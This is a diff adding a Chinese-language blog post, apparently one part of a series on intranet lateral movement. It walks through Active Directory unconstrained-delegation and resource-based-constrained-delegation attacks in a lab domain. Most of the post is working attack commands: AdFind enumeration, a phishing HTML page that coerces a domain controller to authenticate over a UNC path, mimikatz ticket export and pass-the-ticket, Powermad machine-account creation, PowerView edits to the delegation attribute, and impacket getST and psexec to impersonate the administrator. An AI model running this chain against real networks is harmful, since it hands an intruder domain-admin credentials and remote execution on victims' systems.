@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="F4tty" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      内网横向移动(九)-非约束委派&amp;资源约束委派 
+      
+      
+      |
+    
+     F4tty
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/img/favicon.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/img/avatar.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">F4tty</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">内网横向移动(九)-非约束委派&资源约束委派</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-10-18 00:00:00
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                    <b>#</b> 内网安全
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                    #内网
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="内网横向移动-九-非约束委派-amp-资源约束委派"><a href="#内网横向移动-九-非约束委派-amp-资源约束委派" class="headerlink" title="内网横向移动(九)-非约束委派&amp;资源约束委派"></a>内网横向移动(九)-非约束委派&amp;资源约束委派</h1><h2 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h2><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>机器A（域控）访问具有非约束委派权限的机器B的服务，会把当前认证用户（域管用户）的的TGT放在ST票据中，一起发送给机器B，机器B会把TGT存储在lsass进程中以备下次重用。从而机器B就能使用这个TGT模拟认证用户（域管用户）访问服务。</p>
+<h4 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h4><p>攻击者拿到了一台配置非约束委派的机器权限，可以诱导域管来访问该机器，然后得到管理员的TGT，从而模拟域管用户</p>
+<h4 id="复现配置"><a href="#复现配置" class="headerlink" title="复现配置"></a>复现配置</h4><p>1、信任此计算机来委派任何服务<br>2、setspn -U -A priv&#x2F;test webadmin</p>
+<h4 id="判断查询"><a href="#判断查询" class="headerlink" title="判断查询"></a>判断查询</h4><p>查询域内设置了非约束委派的服务账户</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/f7053583/1666082668590-50864619-7838-477f-a199-d266ba2e2043.png" alt="image.png"><br>查询域内设置了非约束委派的机器账户:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/f7053583/1666082686929-1b3555ee-4c49-40f0-8bf1-d186e75baea4.png" alt="image.png"></p>
+<h4 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h4><h5 id="1、域控与委派机器通讯"><a href="#1、域控与委派机器通讯" class="headerlink" title="1、域控与委派机器通讯"></a>1、域控与委派机器通讯</h5><p>主动：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\webserver</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/f7053583/1666082712040-ffad1b73-66d1-41d2-b477-700146d307ed.png" alt="image.png"><br>钓鱼：<br><a target="_blank" rel="noopener" href="http://192.168.3.31/31.html">http://192.168.3.31/31.html</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img src=&quot;file:///\\192.168.3.31\2&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="2、导出票据到本地"><a href="#2、导出票据到本地" class="headerlink" title="2、导出票据到本地"></a>2、导出票据到本地</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/f7053583/1666085095986-a520d694-67a4-433b-81e7-506d3d66d830.png" alt="image.png"></p>
+<h5 id="3、导入票据到内存"><a href="#3、导入票据到内存" class="headerlink" title="3、导入票据到内存"></a>3、导入票据到内存</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt [0;9044d]-2-0-60a00000-Administrator@krbtgt-GOD.ORG.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/f7053583/1666085123452-2f4bf82e-912a-47b1-98cd-8a3ce8db06c0.png" alt="image.png"></p>
+<h5 id="4、连接通讯域控"><a href="#4、连接通讯域控" class="headerlink" title="4、连接通讯域控"></a>4、连接通讯域控</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\owa2010cn-god\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/f7053583/1666085143207-29eef4c6-4830-428d-915d-64208a65bbc9.png" alt="image.png"><br>后续可以利用copy和at命令上线</p>
+<h2 id="资源约束委派"><a href="#资源约束委派" class="headerlink" title="资源约束委派"></a>资源约束委派</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>基于资源的约束委派(RBCD)是在Windows Server 2012中新加入的功能，与传统的约束委派相比，它不再需要域管理员权限去设置相关属性。RBCD把设置委派的权限赋予了机器自身，既机器自己可以决定谁可以被委派来控制我。也就是说机器自身可以直接在自己账户上配置msDS-AllowedToActOnBehalfOfOtherIdentity属性来设置RBCD。计算机加⼊域时，加⼊域的域⽤户被控后也将导致使用当前域用户加入的计算机受控。</p>
+<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>1、域控Windows2012及以上<br>2、存在域内成员用户加入域操作</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用:"></a>利用:</h3><h4 id="获取受害目标"><a href="#获取受害目标" class="headerlink" title="获取受害目标"></a>获取受害目标</h4><p>有哪些域内计算机存在同一用户加入的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -h <span class="number">192.168</span>.<span class="number">3.33</span> -b <span class="string">&quot;DC=xiaodi,DC=local&quot;</span> -f <span class="string">&quot;objectClass=computer&quot;</span> mS-DS-CreatorSID</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/f7053583/1666090340622-92bf4e24-7bab-4090-b7a1-0b7cc2b44509.png" alt="image.png"><br>相同的sid值说明该域用户登录了两个域机器</p>
+<h4 id="判断受害用户"><a href="#判断受害用户" class="headerlink" title="判断受害用户"></a>判断受害用户</h4><p><a target="_blank" rel="noopener" href="https://github.com/bgtiban/Sid2User">https://github.com/bgtiban/Sid2User</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sid2user.exe \\<span class="number">192.168</span>.<span class="number">3.33</span> <span class="number">5</span> <span class="number">21</span> <span class="number">1695257952</span> <span class="number">3088263962</span> <span class="number">2055235443</span> <span class="number">1104</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/f7053583/1666090655341-9317bbfe-9c9d-4b45-adde-0d364048fcf9.png" alt="image.png"></p>
+<h4 id="增加机器"><a href="#增加机器" class="headerlink" title="增加机器"></a>增加机器</h4><p><a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy Bypass -Scope Process #修改powershell执行限制</span><br><span class="line">Import-Module .\Powermad.ps1 #引入powershell脚本</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加一台密码为123456的机器</span></span><br><span class="line">New-MachineAccount -MachineAccount serviceA -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/f7053583/1666092251960-b00b6364-9349-4de1-9b5d-81fc8f99dd83.png" alt="image.png"><br><img src="/posts/f7053583/1666092505116-8718faba-6983-4db5-9295-6ac3e260587e.png" alt="image.png"><br>可以看到机器成功加入</p>
+<h4 id="获取sid"><a href="#获取sid" class="headerlink" title="获取sid"></a>获取sid</h4><p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">Get-NetComputer serviceA -Properties objectsid</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/f7053583/1666092733618-17916e52-66cc-43bb-883b-22870c3bd6d4.png" alt="image.png"></p>
+<h4 id="设置修改属性"><a href="#设置修改属性" class="headerlink" title="设置修改属性"></a>设置修改属性</h4><p>powershell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\powerview.ps1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注意修改sid值</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1695257952-3088263962-2055235443-1602)&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SDBytes = New-Object byte[] (<span class="variable">$SD</span>.BinaryLength)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SD.GetBinaryForm(<span class="variable">$SDBytes</span>, 0)</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">DATA为工具目标的主机名字</span></span><br><span class="line">Get-DomainComputer DATA| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/f7053583/1666093147362-e0d1fc95-9fa9-4b4d-9faf-175637d640b5.png" alt="image.png"></p>
+<h4 id="验证修改是否成功"><a href="#验证修改是否成功" class="headerlink" title="验证修改是否成功"></a>验证修改是否成功</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer DATA -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure>
+
+<h4 id="清除修改设置"><a href="#清除修改设置" class="headerlink" title="清除修改设置"></a>清除修改设置</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject DATA -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br></pre></td></tr></table></figure>
+
+<h4 id="连接目标获取票据"><a href="#连接目标获取票据" class="headerlink" title="连接目标获取票据"></a>连接目标获取票据</h4><p>建立代理<br>记得添加host</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">192.168.3.11 web.xiaodi.org</span><br><span class="line">192.168.3.22 data.xiaodi.org</span><br><span class="line">192.168.3.33 dc.xiaodi.org</span><br><span class="line">192.168.3.33 xiaodi.org</span><br></pre></td></tr></table></figure>
+
+<p>利用impacket套件中的getST.py</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python getST.py -dc-ip 192.168.3.33 xiaodi.local/serviceA\$:123456 -spn cifs/data.xiaodi.local -impersonate administrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/f7053583/1666094566364-1932169d-7a0b-4c9f-9112-8347daccc65b.png" alt="image.png"><br>生成票据上传到win7</p>
+<h4 id="导入票据到内存"><a href="#导入票据到内存" class="headerlink" title="导入票据到内存"></a>导入票据到内存</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptc administrator.ccache</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/f7053583/1666094766052-ad7e47c7-f067-486e-b08a-e3e5e7dcb005.png" alt="image.png"></p>
+<h4 id="连接利用票据"><a href="#连接利用票据" class="headerlink" title="连接利用票据"></a>连接利用票据</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir \\data.xiaodi.local\c$</span><br><span class="line">python psexec.py -k xiaodi.local/administrator@data.xiaodi.local -no-pass</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/f7053583/1666094795264-17a35791-5037-40c2-8952-c689f97168a0.png" alt="image.png"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/dc35434a/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-10-18 00:00:00
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                        <b>#</b> 内网安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                        #内网
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E4%B9%9D-%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-amp-%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-text">内网横向移动(九)-非约束委派&amp;资源约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-text">非约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-text">利用场景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E9%85%8D%E7%BD%AE"><span class="toc-text">复现配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%9F%A5%E8%AF%A2"><span class="toc-text">判断查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-text">利用步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E5%9F%9F%E6%8E%A7%E4%B8%8E%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%99%A8%E9%80%9A%E8%AE%AF"><span class="toc-text">1、域控与委派机器通讯</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E5%AF%BC%E5%87%BA%E7%A5%A8%E6%8D%AE%E5%88%B0%E6%9C%AC%E5%9C%B0"><span class="toc-text">2、导出票据到本地</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81%E5%AF%BC%E5%85%A5%E7%A5%A8%E6%8D%AE%E5%88%B0%E5%86%85%E5%AD%98"><span class="toc-text">3、导入票据到内存</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4%E3%80%81%E8%BF%9E%E6%8E%A5%E9%80%9A%E8%AE%AF%E5%9F%9F%E6%8E%A7"><span class="toc-text">4、连接通讯域控</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-text">资源约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-text">条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%8F%97%E5%AE%B3%E7%9B%AE%E6%A0%87"><span class="toc-text">获取受害目标</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%8F%97%E5%AE%B3%E7%94%A8%E6%88%B7"><span class="toc-text">判断受害用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A2%9E%E5%8A%A0%E6%9C%BA%E5%99%A8"><span class="toc-text">增加机器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96sid"><span class="toc-text">获取sid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E4%BF%AE%E6%94%B9%E5%B1%9E%E6%80%A7"><span class="toc-text">设置修改属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E4%BF%AE%E6%94%B9%E6%98%AF%E5%90%A6%E6%88%90%E5%8A%9F"><span class="toc-text">验证修改是否成功</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B8%85%E9%99%A4%E4%BF%AE%E6%94%B9%E8%AE%BE%E7%BD%AE"><span class="toc-text">清除修改设置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E7%9B%AE%E6%A0%87%E8%8E%B7%E5%8F%96%E7%A5%A8%E6%8D%AE"><span class="toc-text">连接目标获取票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E7%A5%A8%E6%8D%AE%E5%88%B0%E5%86%85%E5%AD%98"><span class="toc-text">导入票据到内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E5%88%A9%E7%94%A8%E7%A5%A8%E6%8D%AE"><span class="toc-text">连接利用票据</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2022 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
